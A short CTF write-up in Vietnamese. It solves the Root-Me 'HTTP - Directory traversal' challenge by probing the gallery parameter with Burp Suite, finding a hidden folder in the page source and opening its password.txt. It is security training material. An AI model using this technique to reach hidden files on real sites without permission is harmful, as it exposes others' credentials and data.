# root-me/HTTP - Directory traversal

## 15/7/2025 

### Đề:

Find the hidden section of the photo galery.

### Giải:

Truy cập `http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=` với burp suite phát hiện 

<img width="941" height="215" alt="image" src="https://github.com/user-attachments/assets/01e7ef3a-4fd9-4cdd-8350-bc1a89253d42" />

Thử truy cập `http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r`

<img width="908" height="321" alt="image" src="https://github.com/user-attachments/assets/df91623b-fb43-4c37-b5d4-c8e1c78e2892" />

Đi `ctrl+u`

```html


<html>
	<body>
		<link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
		<iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
		<h1>Photo gallery v 0.01</h1>
		<span id="mnenu"/>&nbsp;|&nbsp;
		<span>
			<a href="?galerie=emotes">emotes</a>
		</span>&nbsp;|&nbsp;
		<span>
			<a href="?galerie=apps">apps</a>
		</span>&nbsp;|&nbsp;
		<span>
			<a href="?galerie=devices">devices</a>
		</span>&nbsp;|&nbsp;
		<span>
			<a href="?galerie=categories">categories</a>
		</span>&nbsp;|&nbsp;
		<span>
			<a href="?galerie=actions">actions</a>
		</span>&nbsp;|
	</span>
	<span style='text-align: right; float:right;'>Connected as : 
		<b>guest</b>
	</span>
	<br/>
	<hr/>
	<table id="content">
		<tr></tr>
		<tr>
			<td>
				<img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt">
				</td>
				<td>
					<img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg">
					</td>
					<td>
						<img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png">
						</td>
					</tr>
					<tr></tr>
				</table>
			</body>
		</html>
```

Trong đoạn mã có dòng
```html 
src="galerie/86hwnX2r/password.txt"
```
truy cập để lấy pass.

<img width="928" height="139" alt="image" src="https://github.com/user-attachments/assets/e30e5381-2c72-484f-9302-1f8592484e0d" />


